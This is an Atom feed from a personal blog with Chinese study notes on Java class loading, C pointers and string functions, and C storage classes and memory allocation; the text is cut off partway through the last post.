<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcdm123</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-11T11:17:07.790Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>海马少年</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java类加载</title>
    <link href="http://example.com/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>http://example.com/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</id>
    <published>2021-10-11T11:15:55.000Z</published>
    <updated>2021-10-11T11:17:07.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java 程序是由 class 文件组成的一个完整的应用程序，再运行程序时，并不会一次性加载所有的 class 文件进入内存，而是通过 java 的类加载机制进行动态加载，从而转换为 <code>java.lang.Class</code> 的一个实例</p><p>Java 代码需要先编译为 Class 字节码，然后被虚拟机解释执行，把字节码从 Class 文件（或者其他外部来源）加载到内存，并形成可能被 JVM 直接使用得结构数据，这一过程就是类加载</p><p>加载类的过程可以分为：加载、链接（验证 准备 解析）、初始化</p><p>加载===&gt;验证====&gt;准备====&gt;解析====&gt;初始化</p><p>Java 类初始化的时候会调用 <code>java.langClassLoder</code> 加载类字节码，<code>ClassLoader</code> 会调用 JVM 的native方法来定义一个 <code>java.lang.Class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211007203744816.png" alt="image-20211007203744816"></p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>这里父类加载器不是通过继承关系来实现的，而是采用组合实现的</p><p>站在JVM虚拟机的角度讲只存在两种类加载器：</p><ul><li>启动类加载器：使用C++实现</li><li>其他类加载器：使用 java 语言实现</li></ul><p>开发人员角度存在三种类加载器：</p><ul><li>根类加载器</li><li>扩展类加载器</li><li>系统类加载器</li></ul><h3 id="根类加载器（Bootstrap）"><a href="#根类加载器（Bootstrap）" class="headerlink" title="根类加载器（Bootstrap）"></a>根类加载器（Bootstrap）</h3><p>根类加载器是最低层得类加载器，是虚拟机得一部分，它是由C++语言实现得，并且没有父类加载器，也没有继承<code>java.lang.ClassLoader</code>类。它主要负责加载由系统属性 <code>sun.boot.class.path</code> 指定得路径下得核心类库。根类加载器只加载<code>java，javax，sun</code>开头的类。</p><h3 id="扩展类加载器（Extension）"><a href="#扩展类加载器（Extension）" class="headerlink" title="扩展类加载器（Extension）"></a>扩展类加载器（Extension）</h3><p><code>ExtClassLoader</code>父加载器是根类加载器</p><h3 id="系统类加载器（System）"><a href="#系统类加载器（System）" class="headerlink" title="系统类加载器（System）"></a>系统类加载器（System）</h3><p><code>AppClassLoader</code> 应用类加载器，默认的类加载器，父类是扩展类加载器。</p><blockquote><p>java虚拟机对class文件采用的是按需加载的方式，当需要使用该类的时候才会把class文件加载到内存生成class对象。</p><p>加载某个类的class文件时，java虚拟机采用的是双亲委派模式，即把加载类的请求交给父加载器处理，是一种任务委派模式。</p></blockquote><h3 id="JVM类加载机制"><a href="#JVM类加载机制" class="headerlink" title="JVM类加载机制"></a>JVM类加载机制</h3><ul><li>全盘负责：当一个类加载器负责加载某个 Class 时，该 Class 所依赖的和引用的其他 Class 也将由该类加载器负责载入，除非显示的使用另外一个类加载器来载入</li><li>父类委托：让父类加载器试图加载该类，只有父类无法完成时才尝试使用自己路径中的加载器</li><li>缓存机制：将所有的加载过的 Class 都缓存，程序使用某个 Class 时，类加载器先从缓存区寻找该类的 Class，只有缓存区不存在时系统才会读取该类的二进制数据，并将其转换成 Class 对象，存入缓存区。</li></ul><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>加载器比较懒，喜欢把东西交给父类加载，父类加载不了时就会向下委派</p><p>意义：</p><ul><li>系统类防止内存出现多份同样的字节码</li><li>保证 java 程序安全稳定运行</li></ul><h2 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h2><ol><li>命令行启动时由 JVM 初始化加载</li><li>通过 Class.forName() 方法动态加载</li><li>通过 ClassLoader.LoadClass() 方法动态加载</li></ol><blockquote><p>区别就是对于初始化块的处理</p></blockquote><p><img src="D:\markdown\image-20211008011053894.png" alt="image-20211008011053894"></p><h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><blockquote><p>除了根类加载器的所有的类加载器都必须继承<code>java.lang.ClassLoader</code>它是一个抽象类</p></blockquote><p>某些时候我们获取一个类的类加载器时可能会返回一个 null 值，因为 <code>Bootstrap Loader</code>(引导类加载器)是用C语言实现的，找不到一个确定的返回父类Loader的方式，于是就返回NULL</p><p><code>getParent(String name)</code>方法 （返回该类加载器的父类加载器）</p><p><code>loadClass(String name)</code>方法（加载指定的 java 类）</p><p><code>findClass(String name)</code>方法（查找指定的类）</p><p><code>findLoadedClass(String name)</code>方法（查找 JVM 已经加载过的类）</p><p><code>defineClass(String name)</code>方法（ 定义一个java类 ）</p><p><code>resolveClass(String name)</code>方法 （链接指定的 java 类）</p><p><img src="D:\markdown\image-20211007235659052.png" alt="image-20211007235659052"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><blockquote><p>能够从本地或者网络上指定位置加载类</p></blockquote><p>默认父类加载器是系统类加载器，它拥有从远程服务器上加载类的能力，通过 <code>URLClassLoader</code> 可以实现对一些webshell 的远程加载，对某个漏洞的深入利用</p><h2 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h2><p>通常情况下我们会使用系统类加载器，但是有时候会自定义类加载器，比如通过网络传输 java 类的字节码，为了保证安全需要对字节码进行加密处理，这时系统类加载器就无法完成工作。</p><p>一般自定义类加载器的步骤</p><ol><li>继承<code>CLassLoader</code></li><li>重写<code>findClass</code>方法</li></ol><p>需要注意的点：</p><ul><li>最好不要重写 loadClass 方法，这样容易破坏双亲关系</li></ul><p>学习文章</p><p><a href="https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md">https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03">https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java类加载机制&quot;&gt;&lt;a href=&quot;#Java类加载机制&quot; class=&quot;headerlink&quot; title=&quot;Java类加载机制&quot;&gt;&lt;/a&gt;Java类加载机制&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>C学习基础</title>
    <link href="http://example.com/2021/09/27/C%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/09/27/C%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/</id>
    <published>2021-09-26T16:30:08.000Z</published>
    <updated>2021-10-11T11:52:17.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C学习"><a href="#C学习" class="headerlink" title="C学习"></a>C学习</h1><p>[toc]</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>与 C++ 的函数定义差不多，返回值类型，形式参数，需要注意形式参数和实际参数的类型一致性</p><p>主调参数把它的参数值存储在栈区域，被调函数从栈区读取参数</p><p>函数的重要操作：递归</p><p>递归的条件：</p><ul><li>一个问题可分</li><li>把问题分解为规模不同的子问题</li><li>存在中止条件</li></ul><p>递归的基本问题：斐波拉契数列，阶乘，汉诺塔问题，快速排序法</p><p>函数的返回类型和形参列表构成了函数的签名</p><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><blockquote><p>数组指针与 C++ 也基本一样</p></blockquote><p>指针：用于存储变量的地址</p><p>的<code>scanf()</code>函数中就使用地址作为参数，<code>&amp;</code> 取地址，<code>%p</code> 输出地址的转换说明</p><p><code>* </code> 取出指针指向地址的值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920153342073.png" alt="image-20210920153342073"></p><blockquote><p>函数中使用指针传递参数可以直接修改原来的值，比如直接修改数组值等</p><p>指针只能指向声明为统一类型的参数的地址</p></blockquote><p>数组是由同一类型的元素组成</p><p><strong>指针与数组的联合使用</strong></p><p>数组名是数组元素的首地址</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> a[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>a = &amp;a[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>我们可以直接把它赋值给指针，这样就可以利用指针来控制数组</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920155310432.png" alt="image-20210920155310432"></p><p><strong>指针与多维数组</strong></p><p><code>int a[5][3]</code>，这里的地址值有点绕，梳理一下</p><p>a 是二维数组的首地址，<code>a = &amp;a[0]</code> , <code>a[0] == &amp;a[0][0]</code> 所以 <code>*a == &amp;a[0][0]</code> <code>**a == *&amp;a[0][0]</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920162429971.png" alt="image-20210920162429971"></p><p>指针配合多维数组</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920163126063.png" alt="image-20210920163126063"></p><p><strong>函数 数组与指针</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel">// 函数声明<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span> a[], <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span> a[][<span class="hljs-number">4</span>], <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>* a, <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br></code></pre></td></tr></table></figure><p><strong>指针的操作</strong></p><ol><li>赋值：把地址赋值给指针</li><li>解引用：<code>*</code> 取出地址中保存的值</li><li>取址：指针变量也有自己的地址和值</li><li>指针和整数相加：可以使用+运算符把指针与整数相加，或整数与指针 相加。无论哪种情况，整数都会和指针所指向类型的大小（以字节为单位） 相乘，然后把结果与初始地址相加</li><li>递增指针：递增指向数组元素的指针可以让该指针移动至数组的下一个 元素</li><li>指针减去一个整数：可以使用-运算符从一个指针中减去一个整数</li><li>指针求差：计算两个指针的差值（两个指针需要指向同一个数组，差值就为数的距离，否则会报错）</li><li>比较：使用关系运算符可以比较两个指针，前提是两个指针执行的数据类型一样</li></ol><blockquote><p>千万不要解引用未初始化的指针</p></blockquote><p><strong>变长数组</strong></p><p>C 99 中支持边长数组的声明，可以后期输入一个数来定义数组长度，但是还是习惯用 <code>malloc()</code> 来动态分配内存比较好用</p><h3 id="指针函数与函数指针"><a href="#指针函数与函数指针" class="headerlink" title="指针函数与函数指针"></a>指针函数与函数指针</h3><p>指针函数：返回值为指针的函数 <code>int *fun(int x , int y)</code></p><p>函数指针：指向函数的一个指针</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">int (*p)(int x, int y)<br>p = <span class="hljs-function"><span class="hljs-keyword">fun</span> 或者 <span class="hljs-title">p</span></span> = &amp;<span class="hljs-function"><span class="hljs-keyword">fun</span></span><br><span class="hljs-function">使用 <span class="hljs-title">p</span></span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) 或者 (*p)(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>) <br></code></pre></td></tr></table></figure><h2 id="字符操作"><a href="#字符操作" class="headerlink" title="字符操作"></a>字符操作</h2><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><p>回显用户输入的字符后<strong>立即重复打印该字符</strong> 是属于<strong>无缓冲（或直接）输入</strong>，即正在等待的程序可立即使用输入的字符</p><p>大部分系统在用户按下Enter键之前不会重复打印刚输入的字符，这种输入形式属于缓冲输入</p><p>用户输入的字符被收集并且储存在一个称为缓冲区的临时存储区域</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920144846310.png" alt="image-20210920144846310"></p><p>缓冲分为两类：</p><ul><li>完全缓冲：缓冲区填满时才刷新缓冲区（内容发送到目的地），通常出现在文件输入中</li><li>行缓冲：出现换行符时刷新缓冲区，通常用于键盘输入</li></ul><p>字符串是以空字符（\0）结尾的char类型数组</p><p>字符串常量也是存储在静态存储区,对于静态存储区，其中的变量常量在程序运行期间会一直存在，不会释放，且变量常量在其中只有一份拷贝，不会出现相同的变量和常量的不同拷贝。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920172036442.png" alt="image-20210920172036442"></p><p>双引号括起来的内容表示指向该字符串存储位置的指针</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920170710328.png" alt="image-20210920170710328"></p><p>数组获得的是原始字符串的副本</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920172303234.png" alt="image-20210920172303234"></p><p>推荐定义：<code>const char* p = &quot;lcdm123&quot;</code></p><blockquote><p>字符串的绝大多数操作都是依靠指针来完成的</p></blockquote><h3 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h3><p><strong>getchar()  putchar()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-comment">//getchar()和 putchar() 每次只处理一个字符</span><br><span class="hljs-keyword">char</span> a;<br>a = getchar();<br><span class="hljs-built_in">putchar</span>(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920143017458.png" alt="image-20210920143017458"></p><h3 id="字符串输入函数"><a href="#字符串输入函数" class="headerlink" title="字符串输入函数"></a>字符串输入函数</h3><p><strong>gets()</strong></p><p><code>gets()</code>：读取整行输入，直至遇到换行 符，然后丢弃换行符，储存其余字符，并在这些字符的末尾添加一个空字符 使其成为一个 C 字符串</p><blockquote><p>gets() 函数无法检验能否容纳输入的所有字符串，会造成缓冲区溢出</p></blockquote><p><strong>fgets()</strong></p><p><code>fgets()</code>：它通过第二个参数来限制读取字符数从而避免了缓冲区溢出的问题，专门用户处理文件输入。<code>fgets()</code> 读取到第二个参数减一处或者换行符处停止（<code>fgets()</code> 会把换行符储存在字符串中），<code>fgets()</code>函数的第3 个参数指明要读入的文件。如果读入从键盘输入的数据，则以stdin（标准输入）作为参数，该标识符定义在<code>stdio.h</code>中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920174340738.png" alt="image-20210920174340738"></p><blockquote><p><code>fputs() </code>不会在末尾加换行符</p></blockquote><p><strong>gets_s()</strong></p><p>相比于<code>gets()</code> 增加了一个参数来限制输入的字符数量</p><p><strong>s_gets()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">s_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * st, <span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> * ret_val;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>ret_val = fgets(st, n, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-keyword">if</span> (ret_val) <span class="hljs-comment">// 即，ret_val != NULL</span><br>&#123;<br><span class="hljs-keyword">while</span> (st[i] != <span class="hljs-string">&#x27;\n&#x27;</span> &amp;&amp; st[i] != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>i++;<br><span class="hljs-keyword">if</span> (st[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>st[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ret_val;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>scanf()</strong></p><p>常用，没什么可说的</p><h3 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h3><p><strong>puts()与sprintf()</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920165617542.png" alt="image-20210920165617542"></p><p><strong>fputs()</strong></p><p><code>fputs()</code>：它的第二个参数指定需要写入的文件位置，如果是输出的话就是<code>stdout</code>它不会在末尾添加换行符</p><p><strong>printf()</strong></p><p>常用的打印函数</p><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><p><strong>strlen()</strong></p><p><code>strlen()</code> 统计字符串长度，忽略末尾的 <code>\0</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920180046351.png" alt="image-20210920180046351"></p><p><strong>strcat() strncat()</strong></p><p><code>strcat()</code>：字符串拼接，第一个参数为需要拼接的参数，第二个参数就是拼接上的字符串，无法检测第一个参数是否可以容纳第二个参数。</p><p><code>strncat()</code>：该函数的第3 个参数指定了最大添加字符数</p><p><strong>strcmp()</strong></p><p><code>strcmp()</code> 字符串比较函数</p><blockquote><p><code>strcmp()</code>函数比较的是字符串，不是字符，所以其参数应该是字符串</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920181023733.png" alt="image-20210920181023733"></p><p><strong>strncmp()</strong></p><p><code>strcmp()</code>函数比较字符串中的字符，直到发现不同的字符为止，这一过 程可能会持续到字符串的末尾，它可以设置比较到哪一位截至。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920181409653.png" alt="image-20210920181409653"></p><p>  <strong>strcpy()  strncpy()</strong></p><p><code>strcpy()</code> </p><ul><li><code>strcpy()</code>：返回类型是 <code>char *</code>，该函数返回的是一个参数的值即第一个参数的地址</li><li>第一个参数不必指向数组的开始，这个属性可用于拷贝数组的一部分</li><li><code>strcpy()</code>把源字符串中的<strong>空字符也拷贝在内</strong></li></ul><p><code>strncpy()</code></p><p><code>strcpy()</code>和 <code>strcat()</code>都有同样的问题，它们都不能检查目标空间是否能容 纳源字符串的副本，<code>strncpy()</code> 该函数的第三个参数是指明可以拷贝的最大字符串。</p><h3 id="命令行输入"><a href="#命令行输入" class="headerlink" title="命令行输入"></a>命令行输入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// argc 表示参数个数</span><br><span class="hljs-comment">// argv[] 参数数组</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C学习&quot;&gt;&lt;a href=&quot;#C学习&quot; class=&quot;headerlink&quot; title=&quot;C学习&quot;&gt;&lt;/a&gt;C学习&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;</summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>存储类别 链接和内存管理</title>
    <link href="http://example.com/2021/09/21/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://example.com/2021/09/21/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2021-09-21T12:37:58.000Z</published>
    <updated>2021-09-21T14:25:15.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="存储类别、链接和内存管理"><a href="#存储类别、链接和内存管理" class="headerlink" title="存储类别、链接和内存管理"></a>存储类别、链接和内存管理</h1><p>被存储的每个值都占有一定的物理内存，C 语言把这样的一块内存称为对象。</p><p>对象可以存储一个或者多个值，一个对象可能并未存储实际的值，但是它存储实际的值时一定具有相应的大小</p><h2 id="存储类别"><a href="#存储类别" class="headerlink" title="存储类别"></a>存储类别</h2><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>C的作用域：</p><ul><li>块作用域：<code>&#123; &#125;</code></li><li>函数作用域：仅用于函数的 <code>goto</code> 标签</li><li>函数原型作用域：函数的形参</li><li>文件作用域：声明在最开始的变量</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>C 变量有 3 种链接属性：</p><ul><li>外部链接</li><li>内部链接</li><li>无链接</li></ul><p>具有<strong>块作用域、函数作用域或函数原型作用域</strong>的变量都是无链接变量，这意味着这些变量属于定义它们的块、函数或原型私有。</p><p>具有<strong>文件作用域的变量可以是外部链接或内部链接</strong>。<strong>外部链接</strong>变量可以在<strong>多文件程序中</strong>使用，<strong>内部链接</strong>变量只能在一个<strong>翻译单元</strong>中使用。</p><blockquote><p>编译器源代码文件和所有的头文件都看成是一个包含信息的单独文件。这个文件被称为翻译单元 </p></blockquote><p>内部链接的文件作用域称为文件作用域</p><p>外部链接的文件作用域称为全局作用域或者程序作用域</p><blockquote><p>如何知道文件作用域变量是内部链接还是外部链接？可以查看外部定义 中是否使用了存储类别说明符static</p><p><code>int giants = 5;  </code>         // 文件作用域，外部链接 </p><p><code>static int dodgers = 3;</code>   // 文件作用域，内部链接</p><p>对于文件作用域变量，关键字 static表明 了其链接属性，而非存储期</p></blockquote><h3 id="存储期"><a href="#存储期" class="headerlink" title="存储期"></a>存储期</h3><p>存储期描述了通过这些标识符访问的对象的生存期</p><p>C对象有4种存储期：</p><ul><li>静态存储期：程序执行期间一直存在</li><li>线程存储期：用于并发程序设计，程序执行可被分为多个线程，具有线程 存储期的对象，从被声明时到线程结束一直存在</li><li>自动存储期：块作用域的变量通常具有自动存储期，当程序进入定义这些变量的块 时，为这些变量分配内存；当退出这个块时，释放刚才为变量分配的内存</li><li>动态分配存储期</li></ul><h3 id="存储类别-1"><a href="#存储类别-1" class="headerlink" title="存储类别"></a>存储类别</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921135941036.png" alt="image-20210921135941036"></p><p><strong>自动变量</strong></p><p>默认情 况下，声明在块或函数头中的任何变量都属于自动存储类别，变量具有自动存储期意味着，程序在进入该变量声明所在的块时变量存在，程序在退出该块时变量消失</p><blockquote><p>块作用域和无链接意味着只有在变量定义所在的块中才能通过变量名访问该变量</p></blockquote><p>如果内层块中声明的变量与外层块中的变量同名会怎样？内层块会隐藏 外层块的定义。但是离开内层块后，外层块变量的作用域又回到了原来的作 用域</p><p><strong>寄存器变量</strong></p><p>寄存器变量存储在寄存器而不是在内存中，所以无法获取到寄存器变量的地址，与普通变量相比访问和处理的速度较快，大多数方面寄存器变量和自动变量都一样，使用<code>register</code> 来声明寄存器变量</p><blockquote><p>可声明为register的数据类型有限</p></blockquote><h3 id="块作用域的静态变量"><a href="#块作用域的静态变量" class="headerlink" title="块作用域的静态变量"></a>块作用域的静态变量</h3><p>静态的意思是该变量在内存中的地址不变。具有文件作用域的变量自动具有静态存储期。“局部静态变量”是描述具有块作用域的静态变量的另一个术语</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921141811428.png" alt="image-20210921141811428"></p><h3 id="外部链接的静态变量"><a href="#外部链接的静态变量" class="headerlink" title="外部链接的静态变量"></a>外部链接的静态变量</h3><p>外部链接的静态变量具有文件作用域、外部链接和静态存储期</p><p>变量的定义性声明（defining declaration）放 在在所有函数的外面便创建了外部变量，为了指出该函数使用了外部 变量，可以在函数中用关键字extern再次声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> str1;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921142443122.png" alt="image-20210921142443122"></p><h3 id="内部链接的静态变量"><a href="#内部链接的静态变量" class="headerlink" title="内部链接的静态变量"></a>内部链接的静态变量</h3><p>静态存储期、文件作用域和内部链接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">static <span class="hljs-built_in">int</span> svil = <span class="hljs-number">1</span>; <span class="hljs-comment">// 静态变量，内部链接</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921143327517.png" alt="image-20210921143327517"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921143941199.png" alt="image-20210921143941199"></p><h3 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h3><p><code>malloc()</code>：该函数只有一个参数，那就是需要申请的内存字节数，它会找一个合适的内存空闲块，申请一块匿名地址，返回内存地址的首字节地址。可以将返回值赋值给指针，然后利用指针访问这块地址。</p><p><code>free()</code>：释放之前申请的地址，<strong>申请后一定要记得释放</strong></p><blockquote><p><code>void* p</code> 指向 void 的指针，表示通用指针</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921150438063.png" 